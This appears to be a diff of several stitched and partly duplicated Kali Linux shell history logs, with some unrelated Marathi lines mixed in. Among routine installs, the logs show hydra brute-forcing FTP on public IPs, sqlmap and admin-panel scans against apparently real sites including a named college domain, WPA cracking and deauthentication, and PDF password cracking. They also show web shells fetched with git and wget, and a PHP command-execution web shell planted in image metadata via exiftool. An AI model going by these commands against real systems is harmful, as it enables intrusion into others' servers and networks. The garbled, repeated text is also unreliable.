+  533  hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.103 ftp
+  534  /root/Desktop/wordlist-master/hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.103 ftp
+  535  hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.103 ftp/root/Desktop/wordlist-master/
+  536  clear
+  537  hydra -L /root/Desktop/wordlist-master/usernames.txt -P /root/Desktop/wordlist-master/passlist.txt 138.38.88.113 ftp
+  538  hydra -L /root/Desktop/wordlist-master/usernames.txt -P /root/Desktop/wordlist-master/passlist.txt 198.38.88.113 ftp
+  539  nmap 198.38.88.113
+  540  0/tcp  open  pop3
+  541  git clone https://github.com/rdegges/brute.git
+  542  ls
+  543  cd brute
+  544  ls
+  545  chmod +x etup.py
+  546  chmod +x setup.py
+  547  python setup.py
+  548  setup.py --help
+  549  setup.py -help
+  550  setup.py -h
+  551  pip install brute
+  552  brute -h
+  553  brute
+  554  brute-0.0.3
+  555  chmod u+x wasp.sh
+  556  chmod u+x owasp.sh
+  557  ./owasp.sh
+  558  owaspp
+  559  owasp
+  560  zap
+  561  Java -jar zap.jar
+  562  locate zap.jar
+  563  locate zap
+  564  sh/files/bwapp/bWAPP/images/zap.png
+  565  Java -jar zapproxy
+  566  locate zapproxy
+  567  locate zaproxy
+  568  zap.sh
+  569  cd /root
+  570  cd /root/Desktop
+  571  touch om
+  572  mkdir hack
+  573  cd hack
+  574  touch omi
+  575  vim omi
+  576  cat omi
+  577  who
+  578  cat > omi2
+  579  cat omi2
+  580  vim omi2
+  581  head -1 om.txt
+  582  cd /Desktop
+  583  cd /root/Desktop
+  584  head -1 om.txt
+  585  head -10 om.txt
+  586  clear
+  587  tail -3 om.txt
+  588  > newfile
+  589  gedit enw
+  590  gedit om.txt
+  591  # useradd -m = add new user from id 5000 to 6000
+  592  groupadd name = add new roup from id 6000
+  593  #groupadd name = add new roup from id 6000
+  594  @impfiles etc/passwd /shadow/ /group /gshadow
+  595  history
+  596  clear
+  597  cut -d: f1 /etc/passwd
+  598  cut -d: f1 /etc/passwd --help
+  599  cut f1 /etc/passwd
+  600  cut -b /etc/passwd
+  601  cut -b 100 /etc/passwd
+  602  #passwd -d om = to remove passwd from the user naed om
+  603  finger
+  604  ls-l
+  605  ls -l
+  606  chmod g+w+x om.txt
+  607  chmod 765 om.jpeg
+  608  ls -l
+  609  cd /etc/network
+  610  ls
+  611  cp interfaces /root/Desktop
+  612  cp interfaces interfaces.bak
+  613  geany interfaces
+  614  man fdisk -l
+  615  fdisk -l /dev/
+  616  fdisk -l /dev/mmcblk0p2
+  617  df -h
+  618  man df -h
+  619  date
+  620  blkid /dev/root
+  621  blkid /dev/mmcblk0p1
+  622  iwconfig
+  623  iwconfig wlan1
+  624  iwconfig wlan0
+  625  date > date.txt
+  626  ls
+  627  cd ..
+  628  cd /root/Desktop
+  629  date > date.txt
+  630  wifitool
+  631  wget omwaman.xyz
+  632  wget www.omwaman.xyz
+  633  wget www.adarshcollege208.ac.in
+  634  wget www.omwaman.xyz
+  635  wget www.adarshcollege208.ac.in
+  636  cat /etc/sources-list
+  637  cat /etc/source-list
+  638  cat /etc/apt/source.listt
+  639  cat /etc/apt/source.list
+  640  cat /etc/apt/sources.list
+  641  runlevel
+  642  init 6 = switch off
+  643  vim /etc/resol.conf = nameservers
+  644  cd Desktop/
+  645  vim /etc/resol.conf
+  646  cd Desktop/
+  647  vim /etc/resolv.conf
+  648  apt-get install terminator 
+  649  figlet waman
+  650  finglet waman
+  651  apt-get install figlet
+  652  finglet waman
+  653  figlet waman
+  654  clear
+  655  figlet Hellow om waman
+  656  Hi
+  657  figlet Hellow om waman > fig.txt
+  658  figlet Hellow om waman > fig.html
+  659  figlet Hellow om waman > fig
+  660  history]
+  661  history
+  662  apt search pdf editor
+  663  apt-get install sisu
+  664  apt-get install pdftool
+  665  apt-get install pdftoipe
+  666  apt-get install okular
+  667  okular
+  668  2 मागासवगीय वस्ती मधील समार् मंनदर सुशोभीकरण करणे
+  669  ३ मागासवगीय वस्ती मध्ये पाणीपुरवठ् याची व्यवस्था करणे
+  670  ४ मागासवगीय वस्ती मध्ये सी.सी.रस्ता व भू नमगत िाली बाधकाम करणे
+  671  ५ सावार्निक वाचिालय करणे
+  672  locate new.txt
+  673  apt-get install libreoffice
+  674  history > hs.txt
+plasma-browser
+  479  apt-get install smtube
+  480  smtube
+  481  apt-get remove smtube
+  482  apt-get purgwe smtube
+  483  apt-get purge smtube
+  484  twinkle
+  485  apt-get install webext-proxy-switcher
+  486  webext-proxy-switcher
+  487  apt-get install safari
+  488  apt-get install surf
+  489  surf
+  490  apt-get purge surf
+  491  install kiosk
+  492  apt search s
+  493  apt-get install iridium
+  494  apt-get install iridium-browser
+  495  apt-get install tor-browser
+  496  sudo apt-get install -y google-chrome-stable
+  497  sudo apt-get install -y google-chrome-beta
+  498  sudo apt-get install -y google-chrome
+  499  sudo apt-get install -y opera
+  500  sudo apt-get install opera
+  501  apt search opera
+  502  sudo apt-get install vivaldi
+  503  sudo apt-get install midori
+  504  midori
+  505  sudo apt-get --remove purge midori
+  506  sudo apt-get install falkon
+  507  falkon
+  508  apt-get install sandbox
+  509  apt-get install --no-sandbox
+  510  falkon --no-sandbox
+  511  sudo apt-get --remove purge falkon
+  512  apt-get install opera
+  513  apt-get install opera-browser
+  514  apt-get install opera-stable
+  515  apt-get install vivaldi
+  516  apt-get install qupzilla
+  517  qupzilla
+  518  apt-get purge  qupzilla
+  519  apt-get install brave
+  520  apt-get install waterfox
+  521  apt-get install yandex
+  522  apt-get install yandex-browser
+  523  apt search yandex
+  524  apt search browser
+  525  apt search proxy
+  526  git clone https://github.com/GitHackTools/FTPBruter
+  527  cd FTPBruter
+  528  chmod +x ftpbruter.py
+  529  python3 ftpbruter.py
+  530  hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.103 ftp/root/Desktop/wordlist-master/
+  531  clear
+  532  cd..
+  533  hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.103 ftp
+  534  /root/Desktop/wordlist-master/hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.103 ftp
+  535  hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.103 ftp/root/Desktop/wordlist-master/
+  536  clear
+  537  hydra -L /root/Desktop/wordlist-master/usernames.txt -P /root/Desktop/wordlist-master/passlist.txt 138.38.88.113 ftp
+  538  hydra -L /root/Desktop/wordlist-master/usernames.txt -P /root/Desktop/wordlist-master/passlist.txt 198.38.88.113 ftp
+  539  nmap 198.38.88.113
+  540  0/tcp  open  pop3
+  541  git clone https://github.com/rdegges/brute.git
+  542  ls
+  543  cd brute
+  544  ls
+  545  chmod +x etup.py
+  546  chmod +x setup.py
+  547  python setup.py
+  548  setup.py --help
+  549  setup.py -help
+  550  setup.py -h
+  551  pip install brute
+  552  brute -h
+  553  brute
+  554  brute-0.0.3
+  555  chmod u+x wasp.sh
+  556  chmod u+x owasp.sh
+  557  ./owasp.sh
+  558  owaspp
+  559  owasp
+  560  zap
+  561  Java -jar zap.jar
+  562  locate zap.jar
+  563  locate zap
+  564  sh/files/bwapp/bWAPP/images/zap.png
+  565  Java -jar zapproxy
+  566  locate zapproxy
+  567  locate zaproxy
+  568  zap.sh
+  569  cd /root
+  570  cd /root/Desktop
+  571  touch om
+  572  mkdir hack
+  573  cd hack
+  574  touch omi
+  575  vim omi
+  576  cat omi
+  577  who
+  578  cat > omi2
+  579  cat omi2
+  580  vim omi2
+  581  head -1 om.txt
+  582  cd /Desktop
+  583  cd /root/Desktop
+  584  head -1 om.txt
+  585  head -10 om.txt
+  586  clear
+  587  tail -3 om.txt
+  588  > newfile
+  589  gedit enw
+  590  gedit om.txt
+  591  # useradd -m = add new user from id 5000 to 6000
+  592  groupadd name = add new roup from id 6000
+  593  #groupadd name = add new roup from id 6000
+  594  @impfiles etc/passwd /shadow/ /group /gshadow
+  595  history
+  596  clear
+  597  cut -d: f1 /etc/passwd
+  598  cut -d: f1 /etc/passwd --help
+  599  cut f1 /etc/passwd
+  600  cut -b /etc/passwd
+  601  cut -b 100 /etc/passwd
+  602  #passwd -d om = to remove passwd from the user naed om
+  603  finger
+  604  ls-l
+  605  ls -l
+  606  chmod g+w+x om.txt
+  607  chmod 765 om.jpeg
+  608  ls -l
+  609  cd /etc/network
+  610  ls
+  611  cp interfaces /root/Desktop
+  612  cp interfaces interfaces.bak
+  613  geany interfaces
+  614  man fdisk -l
+  615  fdisk -l /dev/
+  616  fdisk -l /dev/mmcblk0p2
+  617  df -h
+  618  man df -h
+  619  date
+  620  blkid /dev/root
+  621  blkid /dev/mmcblk0p1
+  622  iwconfig
+  623  iwconfig wlan1
+  624  iwconfig wlan0
+  625  date > date.txt
+  626  ls
+  627  cd ..
+  628  cd /root/Desktop
+  629  date > date.txt
+  630  wifitool
+  631  wget omwaman.xyz
+  632  wget www.omwaman.xyz
+  633  wget www.adarshcollege208.ac.in
+  634  wget www.omwaman.xyz
+  635  wget www.adarshcollege208.ac.in
+  636  cat /etc/sources-list
+  637  cat /etc/source-list
+  638  cat /etc/apt/source.listt
+  639  cat /etc/apt/source.list
+  640  cat /etc/apt/sources.list
+  641  runlevel
+  642  init 6 = switch off
+  643  vim /etc/resol.conf = nameservers
+  644  cd Desktop/
+  645  vim /etc/resol.conf
+  646  cd Desktop/
+  647  vim /etc/resolv.conf
+  648  apt-get install terminator 
+  649  figlet waman
+  650  finglet waman
+  651  apt-get install figlet
+  652  finglet waman
+  653  figlet waman
+  654  clear
+  655  figlet Hellow om waman
+  656  Hi
+  657  figlet Hellow om waman > fig.txt
+  658  figlet Hellow om waman > fig.html
+  659  figlet Hellow om waman > fig
+  660  history]
+  661  history
+  662  apt search pdf editor
+  663  apt-get install sisu
+  664  apt-get install pdftool
+  665  apt-get install pdftoipe
+  666  apt-get install okular
+  667  okular
+  668  2 मागासवगीय वस्ती मधील समार् मंनदर सुशोभीकरण करणे
+  669  ३ मागासवगीय वस्ती मध्ये पाणीपुरवठ् याची व्यवस्था करणे
+  670  ४ मागासवगीय वस्ती मध्ये सी.सी.रस्ता व भू नमगत िाली बाधकाम करणे
+  671  ५ सावार्निक वाचिालय करणे
+  672  locate new.txt
+  673  apt-get install libreoffice
+  674  history > hs.txt
+on
+59) apt-get install wine32
+60) apt-get install libwine32
+61) apt-get install libwine3
+62) apt-get install libwine#[3
+63) apt-get install libwine
+64) wine om.exe
+65) wine --help
+66) wine --version
+67) sudo dpkg --add-architecture arm64
+69) sudo apt-get install wine32 -y
+70) apt-get install kdeconnect-kde
+71) apt-get install kdeconnect
+72) add-apt-repository main
+73) sudo add-apt-repository main
+74) sudo add-apt-repository universe
+75) sudo add-apt-repository multiverse
+76) apt-get install kdeconnect
+77) kdeconnect
+78) ifconfig
+79) sudo apt-get install wine32 -y
+80) service bluetooth start
+81) service ssh start
+82) ssh --status
+83) apt-get install x11vnc
+84) x11vnc
+85) service x11vnc start
+86) free
+87) firefox
+88) service bluetooth start
+89) ifconfig
+90) ./install.sh
+91) chmod +x install.sh
+92) ./install.sh
+93) hacktronian
+94) apt-get install torcs
+95) sudo apt-get install wine32 -y
+    
+    3  apt-get install vlc
+    4  apt-get install bluetooth
+    5  apt-get install bluez
+    6  service bluetooth start
+    7  bluez
+    8  bluetooth
+    9  service start  bluetooth
+   10  service start bluetooth
+   11  service bluetooth restart
+   12  systemctl restart bluetooth
+   13  service bluetooth status
+   14  apt-get install bluez
+   15  apt-get install bluaz
+   16  apt-get install blueman
+   17  systemctl restart bluetooth
+   18  passwd
+   19  systemctl restart pulseaudio
+   20  vlc
+   21  sed -i 's/geteuid/getppid/'/usr/bin/vlc
+   22  sed -i 's/geteuid/getppid/' /usr/bin/vlc
+   23  vlc
+   24  apt-get install miro
+   25  apt-get install xine
+   26  apt-get install bomi
+   27  apt-get install smplayer
+   28  smplayer
+   29  systemctl restart bluetooth
+   30  firefox
+   31  service bluetooth start
+   32  apt-get install gnome
+   33  wine
+   34  apt-get install wine32
+   35  wine --version
+   36  apt-get remove libwine
+   37  apt-get replace wine32
+   38  apt-get replace libwine
+   39  apt-get remove libwine
+   40  apt-get install wine32
+   41  apt-get install libwine
+   42  apt-get install wine
+   43  ./wine32.sh
+   44  chmod wine32.sh
+   45  chmod +x wine32.sh
+   46  ./wine32.sh
+   47  install wine32.sh
+   48  apt-get install wine32.sh
+   49  apt wine32.shi install
+   50  ./wine32.sh
+   51  ./wine32.sh
+   52  wine /root/Downloads/1.exe
+   53  firefox
+   54  ps
+   55  killall
+   56  killall -u
+   57  apt-get install wine
+   58  wine
+   59  wine --version
+   60  apt-get install wine32
+   61  apt-get install libwine32
+   62  apt-get install libwine3
+   63  apt-get install libwine[3
+   64  apt-get install libwine
+   65  wine om.exe
+   66  wine --help
+   67  wine --version
+   68  sudo dpkg --add-architecture arm64
+   70  sudo apt-get install wine32 -y
+   71  apt-get install kdeconnect-kde
+   72  apt-get install kdeconnect
+   73  add-apt-repository main
+   74  sudo add-apt-repository main
+   75  sudo add-apt-repository universe
+   76  sudo add-apt-repository multiverse
+   77  apt-get install kdeconnect
+   78  kdeconnect
+   79  ifconfig
+   80  sudo apt-get install wine32 -y
+   81  service bluetooth start
+   82  service ssh start
+   83  ssh --status
+   84  apt-get install x11vnc
+   85  x11vnc
+   86  service x11vnc start
+   87  free
+   88  firefox
+   89  service bluetooth start
+   90  ifconfig
+   91  ./install.sh
+   92  chmod +x install.sh
+   93  ./install.sh
+   94  hacktronian
+   95  apt-get install torcs
+   96  sudo apt-get install wine32 -y
+   97  history
+   98  history /root/om.txt
+   99  history o /root/om.txt
+  100  wine 1.exe
+  101  wine64 1.exe
+  102  firefox
+  103  wine64 2.exe
+  104  wine32 2.exe
+  105  wine32 /root/Downloads2.exe
+  106  wine32 /root/Downloads/2.exe
+  107  wine64 /root/Downloads/2.exe
+  108  wine64 --version
+  109  wine64 --help
+  110  uname
+  111  uname -a
+  112  wine /root/Downloads/1
+  113  wine 1.exe
+  114  wine
+  115  cd ..
+  116  wine
+  117  file wine
+  118  file ./wine
+  119  file ./wine32
+  120  file wine32
+  121  wine64
+  122  wine64 1.exe
+  123  winecf
+  124  winecfg
+  125  wine64cfg
+  126  wine64 /root/Downloads/1.exe
+  127  apt-get install wine32
+  128  wine64 npp.7.Installer.x64exe
+  129  wine64 /root/Downlodsnpp.7.Installer.x64exe
+  130  wine64 /root/Downlods/npp.7.Installer.x64exe
+  131  wine64 /root/Downloads/npp.7.Installer.x64exe
+  132  wine64 /root/Downloads/npp.7.Installer.x64.exe
+  133  wine64 /root/Downloads/npp.7.8.4.Installer.exe
+  134  d ..
+  135  cd ..
+  136  exagear
+  137  arch
+  138  dpkg --add-architecture i36
+  139  dpkg --add-architecture i386
+  140  aarch
+  141  arch
+  142  dpkg --add-architecture i386
+  143  dpkg --add-architecture i386 -y
+  144  dpkg --force-help
+  145  dpkg --add-architecture i386 --force
+  146  dpkg --add-architecture i386 --force-!
+  147  wine64 /root/Downloads/1.exe
+  148  wine32 /root/Downloads/1.exe
+  149  wine /root/Downloads/1.exe
+  150  firefox
+  151  ne32
+  152  wine32 --version
+  153  wine32
+  154  wine3 --version
+  155  wine --version
+  156  apt-get remove wine32
+  157  apt-get remove wine
+  158  wine64 --version
+  159  apt-get install wine64
+  160  wine64 --version
+  161  apt-get install wine
+  162  wine64 --version
+  163  --add0-architecture i386
+  164  --add-architecture i386
+  165  dpkg --add-architecture i386
+  167  apt-get install wine
+  168  apt-get install wine-bin:i386
+  169  wine --version
+  170  apt-get install wine32
+  171  wine32:i386
+  172  wine32:i386 --versio
+  198  airmon-ng
+  199  start wlan1mon
+  200  airmon-ng start wlan1
+  201  wifite
+  202  apt-get install wifite2
+  203  wifite2
+  204  wifite
+  205  firefox
+  206  wifite
+  207  ls
+  208  ./pentmenu
+  209  wifite
+  210  apt-get install wifite
+  211  wifite
+  212  start wlan1mon
+  213  airmon-ng start wlan1mon
+  214  wifite
+  215  airmon-ng wlan1 status
+  216  ifconfig
+  217  wifite
+  218  airodump-ng wlan1mon
+  219  airodump-ng --08:25:25:54:51:91 --hannel 1 wlan1mon
+  220  airodump-ng --08:25:25:54:51:91 --channel 1 wlan1mon
+  221  airodump-ng -- 08:25:25:54:51:91 --channel 1 wlan1mon
+  222  airodump-ng -- 08:25:25:54:51:91 --C 1 wlan1mon
+  223  airodump-ng -08:25:25:54:51:91 --C 1 wlan1mon
+  224  airodump-ng --help
+  225  airodump-ng --bssid  08:25:25:54:51:91 --channel 1 wlan1mon
+  226  aircrack-ng -a2 08:25:25:54:51:91 -w /root/Desktop/pass.txt /root/Desktop/*.cap
+  227  wifite
+  228  p
+  229  airplay-ng -a 08:25:25:54:51:91 -o 0 wlan1mon
+  230  airplay-ng
+  231  apt-get install irplay-ng
+  232  apt-get install airplay-ng
+  233  airplay-ng -a 08:25:25:54:51:91 -o o wlan1mon
+  234  airplay-ng man
+  235  man airplsy-ng
+  236  man airplay-ng
+  237  firefox
+  238  apt-ge install pdfcrackj
+  239  apt-ge install pdfcrack
+  240  apt-get install pdfcrack
+  241  pdfcrack
+  242  crunch 5 5 sonalkurihvm -s -o
+  243  crunch 5 5 sonalkurihvm -s 33 -o /root/Desktop.123.pdf
+  244  crunch 5 5 sonalkurihvm -s 1 -o /root/Desktop.123.pdf
+  245  crunch 2  5 sonalkurihvm -s 1 -o /root/Desktop.123.pdf
+  246  crunch 2  5 sonalkurihvm -s -o /root/Desktop.123.pdf
+  247  crunch 4 5 sonalkurihvm1234 -o /root/Desktop.123.pdf
+  248  crunch 4 5 sonalkurihvm1234 -o os.txt
+  249  apt-get install cupp
+  250  cupp
+  251  cupp -i
+  252  apt-get install pistolero
+  253  pdfcrack 123.pdf sonal.txt
+  254  cd Desktop
+  255  pdfcrack 123.pdf sonal.txt
+  256  pdfcrack f  123.pdf
+  257  pdfcrack -f 123.pdf
+  258  wifitwe
+  259  wifite
+  260  crunch 6 6 kurilsavno -o ok.txt
+  261  pdfcrack -f ok.txt
+  262  pdfcrack -f 123.pdf pk.txt
+  263  pdfcrack -f 123.pdf ok.txt
+  264  pdfcrack -f 123.pdf -c ok.txt
+  265  pdfcrack -f 123.pdf -c os.txt
+  267  wifite
+  268  kill all
+  269  kill
+  270  man kill
+  271  kill ps
+  272  ps
+  273  ps kill
+  274  kill --help
+  275  kill -l
+  276  2
+  277  kill -l
+  278  wifite
+  279  crunch 2 4 omwman o m.txt
+  280  wifite
+  281  windows
+  282  ll'l'k
+  283  ./pentmenu
+  284  ls
+  285  cd /Desktop
+  286  ./pentmenu
+  287  wifite
+  288  firefox
+  289  wifite
+  290  start wlan1mon
+  291  swrvice start wlan1mon
+  292  airodump-ng start wlan1mon
+  293  airodump-ng start wlan1
+  294  service mysql stop
+  295  service apache2  stop
+  296  service apache2 stop
+  297  service mysql start
+  298  service apache2 start
+  299  service apache2 start
+  300  service postgresql start
+  301  service mysql start
+  302  apt-get install mysql
+  303  apt-get install mysql-server
+  304  apt-get install mariadb-server
+  305  service mysql start
+  306  apt-get install php
+  307  apt-get install php7.0-dom
+  308  php --version
+  309  apt-get install php7.3-dom
+  310  apt-get update --fix-missing
+  311  apt-get install php7.3-gd
+  312  service apache2 restart
+  313  apt-get install php7.3-mbstring
+  314  service apache2 restart
+  315  apt-get install php7.3-mysql
+  316  service apache2 restart
+  317  drush vset clean_url 0 --yes
+  318  mysql -u root -p
+  319  service mysql restart
+  320  service apache2 restart
+  321  service mysql restart
+  322  mysql -u root -p
+  323  service mysql stop
+  324  service apache2 stop
+  325  service mysql start
+  326  service apache2 start
+  327  mysql -u root -p -e
+  328  mysql -u root -p
+  329  netstat -tupan | grep mysql
+  330  service apache2 stop
+  331  service mysql stop
+  332  service apache2 start
+  333  service mysql start
+  334  ./debian.noip2.sh
+  335  chmod +x V
+  336  ./debian.noip2.sh
+  337  chmod +x debian.noip2.sh
+  338  ./debian.noip2.sh
+  339  ./debian.noip2.sh start
+  340  make
+  341  make install
+  342  ls
+  343  cat noip2.c
+  344  ./noip2
+  345  noip2
+  346  chmod +x noip2
+  347  ls
+  348  ./noip2
+  349  ./noip2-c
+  350  ./noip2-C
+  351  usr/local/bin/local/noip2
+  352  usr/local/bin/noip2
+  353  usr/local/bin/noip2.conf
+  354  cd usr/local/bin
+  355  cd /usr/local/bin
+  356  usr/local/bin/noip2.conf
+  357  usr/local/bin/noip2
+  358  /usr/local/bin/noip2
+  359  /usr/local/bin/no-ip2.conf
+  360  ls
+  361  install  debian.noip2.sh
+  362  ./debian.noip2.sh
+  363  chmod +x debian.noip2.sh
+  364  ./debian.noip2.sh
+  365  ./debian.noip2.sh start
+  366  /usr/local/bin/noip2
+  367  ./pentmenu
+  368  cd Desktop
+  369  ./pentmenu
+  370  nmap adarshcollege208.ac.in
+  371  omwhte./
+  372  ./omwhte
+  373  nmap adarshcolle208.ac.in
+  374  nmap adarshcollege208.ac.in
+  375  ./owwhte
+  376  ./omwhte
+  377  firefox
+  378  wifite
+  379  ipconfig
+  380  ifconfig
+  381  cd Desktop
+  382  ./TrackUrl.sh
+  383  www.github.com/zanyarjamal/TrackUrl.git
+  384  git clone www.github.com/zanyarjamal/TrackUrl.git
+  385  git clone https://www.github.com/zanyarjamal/TrackUrl.git
+  386  git clone https://github.com/Mauladen/TrackUrl.git
+  387  ./TrackUrl
+  388  TrackUrl
+  389  firefox
+  390  ./TrackUrl
+  391  ./TrackUrl.sh
+  392  ls
+  393  chmod +x Trackurl
+  394  chmod +x TrackUrl
+  395  chmod +x TrackUrl.sh
+  396  ./TrackUrl.sh
+  397  ngrok
+  398  ls
+  399  ./ngrok
+  400  chmod +x ngrok
+  401  ./ngrok
+  402  cd ..
+  403  git clone https://www.github.com/Juniorn1003/Faitagram.git
+  404  ls
+  405  cd Faitagram
+  406  ls
+  407  chmod +x setup.py
+  408  python setup.py
+  409  python2 setup.py
+  410  python3 setup.py
+  411  python setup.py
+  412  chmod +x faitagram && chmod +x setup.py
+  413  setup.py
+  414  install python setup.py
+  415  python setup.py
+  416  cd ..
+  417  git clone https://www.github.com/thewhiteh4t/seeker
+  418  ls
+  419  ./build.sh
+  420  install ./build.sh
+  421  ./install.sh
+  422  python3 seeker.py
+  423  fitefox
+  424  firefox
+  425  apt-get install ngrok
+  426  apt-get update
+  427  apt-get install gparted
+  428  firefox
+  429  git clone file:///usr/share/kali-defaults/web/homepage.html
+  430  /coding.sh
+  431  ./coding.sh
+  432  chmod
+  433  chmod +x coding.sh
+  434  ./coding.sh
+  435  firefox
+  436  ./coding1.sh
+  437  chmod +x coding1.sh
+  438  cd Desktop
+  439  chmod +x coding1.sh
+  440  ./coding1.sh
+  441  firefox
+  446  apt-get install pulseaudio
+  447  ifconfig
+  448  apt get install vim
+  449  apt-get install vim
+  450  vim
+  451  service bluetooth start
+  452  vlc
+  453  service bluetooth stsrt
+  454  service blueyooyh start  468  service mysql start
+  469  mysql -u root
+  470  apt
+  471  apt-get install php7.3-dom
+  472  service apache2 restart
+  473  service mysql restart
+  474  cd /var/www/html/
+  475  ls
+  476  cdmod a+w sites/defaults
+  477  cdmod a+w sites/default/
+  478  chmod a+w sites/default/
+  479  cd default/
+  480  cd /sites/default/
+  481  ls
+  482  cd /sites/default/
+  483  cd sites/
+  484  ls
+  485  cd default/
+  486  ls
+  487  cp default.settings.php
+  488  cp default.settings.php settings.php
+  489  ls
+  490  cdmod a+w sttings.php
+  491  chmod a+w sttings.php
+  492  ls
+  493  chmod a+w settings.php
+  494  ls
+  495  service apache2 re start
+  496  service apache2 restart
+  497  mysql-u root -pomsom collegesx
+  498  mysql-u root -pomsom colleges
+  499  mysql-u root -p
+  500  mysql-u root -p;
+  501  mysql -u root -pomsom colleges
+  502  apt-get install php7.3-gd
+  503  service apache2 stop
+  504  service mysql stop
+  505  service postgresql stop
+  506  service apache2 start
+  507  service mysql start
+  508  service postgresql start
+  509  apt-get install php7.3-mbstring
+  510  mariadb -u root -p
+  511  apt-get --remove purge mysql
+  512  service mysql start
+  513  apt-get uninstall maradb-server
+  514  apt-get uninstall mariadb-server
+  515  apt-get remove  mariadb-server
+  516  mysql -u root -p
+  517  apt-get remove mariadb-server
+  518  apt-get purge  mariadb-server
+  519  apt-get install mariadb-server
+  520  service mysql start
+  521  sevice apache2 start
+  522  service apache2 start
+  523  service postgresql start
+  524  mysql -u root -p
+  525  service apache2 restart
+  526  service mysql restart
+  527  mysql -u root -p
+  528  chmod a+w /var
+  529  mysql -u root -p
+  530  service mysql restart
+  531  service apache2 restart
+  532  mysqladmin -u username -p create databasename
+  533  service mysql restart
+  534  mysqladmin -u username -p create hanuman
+  535  update mysql.user set plugin = 'mysql_native_password' where User='root';
+  536  mysql;
+  537  mysql -u root -p
+  538  mysql -u root -p hanuman
+  539  mysql -u root -p
+  540  service mysql stop
+  541  service apache2 stop
+  542  service mysql start
+  543  service apache2 start
+  544  service postgresql start
+  545  servise mysql start
+  546  service  mysql start
+  547  service mysql start
+  548  service postgresql start
+  549  service apache2 start
+  550  mysql -u root -p
+  551  service mysql stop
+  552  service apache2 stop
+  553  service postgresql stop
+  554  service mysql start
+  555  service apache2 start
+  556  service postgresql start
+  557  IFCONFIG
+  558  ifconfig
+  559  firefox
+  560  restart
+  561  reboot
+  562  apt-get install chrome
+  563  apt-get install chromium
+  564  chromium
+  565  chromium-browser
+  566  apt install nginx
+  567  cd /etc/nginx/
+  568  ls
+  569  nano nginx.conf
+  570  apt install tor
+  571  service tor start
+  572  nano /etc/tor/torrc
+  573  ifconfig
+  574  service bluetooth start
+  575  FTP 157.33.241.171
+  576  ftp 157.33.241.171
+  577  apt-get install android-file-transfer
+  578  android-file-transfer
+  579  apt-get reove android-file-transfer
+  580  apt-get remove android-file-transfer
+  581  service apache2 start
+  582  service ysql start
+  583  service mysql start
+  584  splmap -u http://omw.epizy.com/?i=1 --dbs
+  585  sqlmap -u http://omw.epizy.com/?i=1 --dbs
+  586  apt-get update mysqlmap
+  587  apt-get update sqlmap
+  588  apt-get install sqlmap
+  589  sqlmap
+  590  sqlmap -h
+  591  apt-get install filezilla
+  592  filezilla
+  593  sarvis bultut star
+  594  sarvis bultuth asta
+  595  staa blueooth stasr
+  596  bluetooth
+  597  service bletooth star
+  598  SERVICE BLUETOOTH STAR
+  599  service bletooth start
+  600  service bluetooth start
+  601  ./shell.php
+  602  ./shellg.php
+  603  chod +x shellg.php
+  604  chodm +x shellg.php
+  605  chmod +x shellg.php
+  606  ./shellg.php
+  607  ./shell.pp
+  608  ./shell.php
+  609  chmod +x shell.php
+  610  ./shell.php
+  611  ls
+  612  chmod +x cpanel.php
+  613  ./cpanel.php
+  614  git clone https://github.com/ywn/c99shell.git
+  615  ls
+  616  chmod +x shell.php
+  617  ./shell.php
+  618  mkdir /root/backdoor
+  619  ls
+  620  cd /root/backdoor
+  621  wget http://r57.gen.tr/shell/c9.rar
+  622  ls
+  623  unrar x c9.rar
+  624  service mysql start
+  625  service apache2 start
+  626  apt-get install csh
+  627  csh
+  628  apt-get install metasploit
+  629  apt-get install metasploit-framework
+  630  apt-get install metasploitable
+  631  tor
+  632  exiftool -DocumentName="<h1>RAZZOR<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" img.jpeg
+  633  apt-get install exiftool
+  634  cd /Desktop
+  635  cd /root/Desktop
+  636  exiftool -DocumentName="<h1>RAZZOR<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" img.jpeg
+  637  nc -l -v -p 13123
+  638  ifconfig
+  639  nc -l -v -p 13123
+  640  nc -l -v -p 110
+  641  service mysql start
+  642  service apache2 start
+  643  paython beacher.py
+  644  paython -h
+  645  paython -hls
+  646  ls
+  647  chmod +x beacher.py
+  648  chmod +x breacher.py
+  649  ls
+  650  paython breacher.py -h
+  651  python breacher.py -h
+  652  python breacher.py
+  653  python breacher.py -u https://adarshcollege208.ac.in
+  654  chmod +x breacher.py
+  655  python breacher.py -u https://adarshcollege208.ac.in
+  656  python breacher.py -u http://adarshcollege208.ac.in
+  657  service mysql start
+  658  service apache2 start
+  659  pip install -r requirements.txt
+  660  apy install -r requirements.txt
+  661  apt install -r requirements.txt
+  662  apt install requirements.txt
+  663  apt-get install mechanize
+  664  apt install mechanize
+  665  PIP install -r requirements.txt
+  666  bash install -r requirements.txt
+  667  chmod +x blazy.py
+  668  ls
+  669  python blazy.py
+  670  python setup.py
+  671  PIP install -r requirements.txt
+  672  python setup.py install
+  673  python setup.py
+  674  PIP inservice bluetooth start
+  675  ervice bluetooth start
+  676  service bluetooth start
+  677  serivce bluetooth start
+  678  serivce bluetooth start 
+  679  serivce bluetooth start
+  680  service bluetooth start
+  681  apt-get update
+  682  ifconfig
+  683  serivce bluetooth startsdfdsfjhjn 
+  684  ser vice 
+  685  service mysql start
+  686  service apache2 start
+  687  chmod u+x brp.sh
+  688  ./brp.sh
+  689  ap-get install openjdk-8-jre
+  690  apt-get install openjdk-8-jre
+  691  apt-get install java
+  692  apt-get install jdk
+  693  apt-get install openjdk-8-jre
+  694  apt-get update
+  695  ls
+  696  cd /root/Desktop
+  697  ls
+  698  chmod -u+x brp.sh
+  699  ls
+  700  ./brp.sh
+  701  install ./brp.sh
+  702  apt install ./brp.sh
+  703  apt install brp.sh
+  704  apt-get install
+  705  apt-get upgrade
+  706  service bluetooth start
+  707  ls
+  708  bash brp.sh
+  709  apt-get install openjdk-8-jre
